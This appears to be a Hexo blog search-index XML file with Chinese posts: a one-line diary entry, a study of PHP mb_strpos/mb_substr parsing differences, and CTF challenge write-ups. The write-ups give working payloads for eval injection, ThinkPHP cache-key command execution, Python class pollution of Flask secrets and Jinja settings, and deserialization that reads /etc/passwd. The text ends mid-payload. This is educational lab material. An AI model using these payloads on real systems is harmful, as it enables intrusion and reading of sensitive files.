<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>8-5</title>
      <link href="/2024/08/05/8-5/"/>
      <url>/2024/08/05/8-5/</url>
      
        <content type="html"><![CDATA[<p>​经历了今晚，我只能说，老人所说的话真的是有道理的，不听老人言，吃亏在眼前😥😥。还有，失而复得的感觉belike……(请自行想象)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日常感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中mb_strpos与mb_substr详记</title>
      <link href="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/"/>
      <url>/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​在上次参加一个比赛的时候，第一次在比赛中看到反序列化题目中出现了mb_strpos和mb_substr这两个函数，当时看到那道题也是一头雾水，也不知道怎么做（还是知识太浅薄了），然后结束之后复现了两道题就因为一些事情不了了之了。不过把我气笑的是，那会该复现的下道题就是和这个知识点有关的题，看来还是得搞懂才行，这次又遇到不能放过了。</p><h3 id="1-漏洞产生原因"><a href="#1-漏洞产生原因" class="headerlink" title="1.漏洞产生原因"></a>1.漏洞产生原因</h3><p>​mb_strpos和mb_substr以不同的方式处理无效的UTF-8序列，对某些不可见字符的解析差异导致漏洞。</p><p>参考链接：</p><p><a href="https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/">https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><h3 id="2-搭建试验环境"><a href="#2-搭建试验环境" class="headerlink" title="2.搭建试验环境"></a>2.搭建试验环境</h3><p>​在本地运行，然后访问<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="number">0</span>].<span class="string">&quot;[welcomectfer]&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure><h3 id="3-开始实验"><a href="#3-开始实验" class="headerlink" title="3.开始实验"></a>3.开始实验</h3><h4 id="（1）正常情况"><a href="#（1）正常情况" class="headerlink" title="（1）正常情况"></a>（1）正常情况</h4><p>尝试随便传参，可以看到，正常情况下，它会输出<code>[</code>和<code>]</code>所在的位置下标，以及截取的<code>[]</code>中的内容</p><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/8-1721485111731-1.png" alt="8"></p><h4 id="（2）mb-strpos-增加逃逸一个或多个字符"><a href="#（2）mb-strpos-增加逃逸一个或多个字符" class="headerlink" title="（2）mb_strpos  增加逃逸一个或多个字符"></a>（2）mb_strpos  增加逃逸一个或多个字符</h4><p>经过多次尝试终于发现，当传入的参数的值范围在<code>%80~%bf</code>时，mb_strpos返回的<code>[</code>和<code>]</code>的下标位置并没有发生变化，可见<code>mb_strpos</code>会自动忽略这些不可见字符，而<code>mb_substr</code>不会忽略，它会将这个不可见字符解析为一个字符，并打印出来，就会导致截断的字符前移一个或多个位置。<img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/9-1721485159988-3.png" alt="9"></p><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/10-1721485177918-5.png" alt="10"></p><h4 id="（3）在-c0-c1-两个函数都正常"><a href="#（3）在-c0-c1-两个函数都正常" class="headerlink" title="（3）在%c0~%c1,两个函数都正常"></a>（3）在<code>%c0~%c1</code>,两个函数都正常</h4><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/11-1721485205433-7.png" alt="11"></p><h4 id="（4）mb-substr-减少逃逸"><a href="#（4）mb-substr-减少逃逸" class="headerlink" title="（4）mb_substr  减少逃逸"></a>（4）mb_substr  减少逃逸</h4><p>​在<code>%c2~%df</code>，<code>mb_strpos</code>正常解析，而<code>mb_substr</code>会把它与后面连着的一个字符(<code>[</code>)都当作一个字符，即最终截断的字符会后移一个位置。！</p><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/12-1721485233537-9.png" alt="12"></p><p>​在<code>%e0~%ef</code>，<code>mb_strpos</code>正常解析，而<code>mb_substr</code>会把它与后面连着的两个字符(<code>[w</code>)都当作一个字符，截断的字符会后移两个位置。！！</p><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/13-1721485244009-11.png" alt="13"></p><p>​在<code>%f0~%f4</code>，<code>mb_strpos</code>正常解析，而<code>mb_substr</code>会把它(%f0)与后面连着的三个字符(<code>[we</code>)都当作一个字符，截断的字符会后移三个位置。！！！</p><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/14-1721485253772-13.png" alt="14"></p><h3 id="5-任意构造"><a href="#5-任意构造" class="headerlink" title="(5)任意构造"></a>(5)任意构造</h3><p>​知道了前面的知识之后，我们就可以利用增加逃逸和减少逃逸这两个特性实现任意字符的构造。</p><p>​暂时我们可以先使用增加逃逸(%9f),减少逃逸(%f0)来构造，当然使用别的也是可以的。</p><p>​比如我们用%9f来增加逃逸，那么想要逃逸出来几个字符我们在前面就要加上几个 %9f，比如，要逃逸”lalala”,共6个字符，那我们要在前面加上6个%9f，如下图，任意构造成功。！！</p><p><img src="/2024/07/20/PHP%E4%B8%ADmb-strpos%E4%B8%8Emb-substr%E8%AF%A6%E8%AE%B0/15-1721485296999-15.png" alt="15"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西瓜杯复现</title>
      <link href="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>官方wp:<a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1</a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、CodeInject"><a href="#一、CodeInject" class="headerlink" title="一、CodeInject"></a>一、CodeInject</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#Author: h1xa</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump((Object)<span class="subst">$_POST</span>[1]);&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接闭合即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=1);system(&#x27;cat /0*&#x27;);//</span><br><span class="line">1=1);system(&#x27;cat /0*&#x27;);?&gt;</span><br><span class="line">1=system(&#x27;cat /0*&#x27;)</span><br></pre></td></tr></table></figure><h2 id="二、tpdoor"><a href="#二、tpdoor" class="headerlink" title="二、tpdoor"></a>二、tpdoor</h2><p>源码:</p><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/1-1721200496429-1.png" alt="1"></p><p>​发现<code>$isCache</code>是可控的，又看到将$isCache赋值给了<code>$config[&#39;request_cache_key&#39;]</code>,在仅给出的php代码中找不到信息，应该靠的是ThinkPHP相关漏洞，就猜测在ThinkPhp最新版源码中查找信息。</p><p>​全局搜索<code>request_cache_key</code>，发现两处</p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/2.png" alt="2"><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/3.png"></p><p>​接下来开始审<code>CheckRequestCache.php</code></p><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><p>​从上图看到：getRequestCache给key赋值，最终key传到了parseCacheKey中</p><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><p>最后 $key 作为参数，$fun 作为函数执行它，即可尝试构造部分构造 payload <code>whoami|system</code></p><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><p>​最终在尝试的时候，发现只能执行一次system，即当你执行了访问<code>/?isCache=ls /|system</code> 的时候，它先返回<code>cache is enable</code>,然后返回根目录下的文件，即下面的第一次， 再访问<code>/?isCache=cat /0*|system</code>是不行的，需要重新开启题目，一步到位。</p><p>第一次：</p><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/image-20240717161946729.png" alt="image-20240717161946729"></p><p>第二次(重开题目)：</p><p><img src="/2024/07/17/%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%A4%8D%E7%8E%B0/image-20240717162256030.png" alt="image-20240717162256030"></p><p><a href="https://blog.csdn.net/qq_63217130/article/details/140301611">https://blog.csdn.net/qq_63217130/article/details/140301611</a></p><h2 id="三、easy-polluted"><a href="#三、easy-polluted" class="headerlink" title="三、easy_polluted"></a>三、easy_polluted</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://tttang.com/archive/1876/#toc__12</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for,request,render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_md5</span>():</span><br><span class="line">    random_string = os.urandom(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line">    <span class="keyword">return</span> md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">user_input</span>):</span><br><span class="line">    blacklisted_patterns = [<span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklisted_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">filter</span>(<span class="built_in">str</span>(request.data)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    password = session.get(<span class="string">&quot;password&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;adminer&quot;</span> <span class="keyword">and</span> password == app.secret_key:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Hello,  This is the POLLUTED page.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>1.污染secret_key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init__&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123; <span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;secret_key&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;</span>:&#123;<span class="string">&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;</span>:&#123;<span class="string">&quot;\u0061pp&quot;</span>:&#123;<span class="string">&quot;config&quot;</span>: &#123;<span class="string">&quot;SECRET\u005FKEY&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>2.登录，获取session session&#x3D;eyJwYXNzd29yZCI6Im5hbWUiLCJ1c2VybmFtZSI6ImFkbWluZXIifQ.ZpzhSw.bUHfbuDadn0YEB4XheAMQ-U55Y4</p><p>3.带着session访问&#x2F;adminn</p><p>4.然后污染jinja的变量语义符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;__init__&quot;</span> : &#123; <span class="string">&quot;__globals__&quot;</span> : &#123; <span class="string">&quot;app&quot;</span> : &#123; <span class="string">&quot;jinia_env&quot;</span> :&#123; </span><br><span class="line">    <span class="string">&quot;variable_start_string&quot;</span> : <span class="string">&quot;[#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;variable_end_string&quot;</span> : <span class="string">&quot;#]&quot;</span></span><br><span class="line">&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">Unicode编码:</span><br><span class="line">&#123;<span class="string">&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;</span>:&#123;<span class="string">&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;</span>:&#123;<span class="string">&quot;\u0061\u0070\u0070&quot;</span>:&#123;<span class="string">&quot;jinja\u005F\u0065nv&quot;</span>:&#123;<span class="string">&quot;variable\u005Fstart\u005F\u0073tring&quot;</span>:<span class="string">&quot;[#&quot;</span>,<span class="string">&quot;variable\u005Fend\u005F\u0073tring&quot;</span>: <span class="string">&quot;#]&quot;</span>&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>5.再次带着session访问&#x2F;admin即可</p><h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>​把flag所在的&#x2F;static&#x2F;flag的服务器目录替换成根目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;adminer&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span> : &#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span> :&#123;<span class="string">&quot;\u0061\u0070\u0070&quot;</span> :&#123;<span class="string">&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;</span>: <span class="string">&quot;123&quot;</span>,<span class="string">&quot;\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072&quot;</span>:<span class="string">&quot;\u002f&quot;</span>&#125;&#125;&#125;&#125;</span><br><span class="line">_static_folder</span><br></pre></td></tr></table></figure><h2 id="四、Ezzz-php"><a href="#四、Ezzz-php" class="headerlink" title="四、Ezzz_php"></a>四、Ezzz_php</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="comment">//O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:3:&quot;123&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><h3 id="1-漏洞产生原因"><a href="#1-漏洞产生原因" class="headerlink" title="1.漏洞产生原因"></a>1.漏洞产生原因</h3><p>​mb_strpos和mb_substr以不同的方式处理无效的UTF-8序列，对某些不可见字符的解析差异导致漏洞。</p><p>​想看详细的介绍在另外一篇博客中。</p><h3 id="2-开始解题"><a href="#2-开始解题" class="headerlink" title="2.开始解题"></a>2.开始解题</h3><p>​（1）分析代码，发现它的关键语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br></pre></td></tr></table></figure><p>第一种传参：</p><p>​我们可以通过传参<code>read</code>为不可见字符，<code>start</code>为我们需要构造的反序列化链，比如下面第一行的代码，那么这样相当于进行了两次序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc1:  O:<span class="number">9</span>:<span class="string">&quot;read_file&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;gxngxngxn&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">55</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>;&#125;</span><br><span class="line">poc2:  O:<span class="number">9</span>:<span class="string">&quot;read_file&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">126</span>:<span 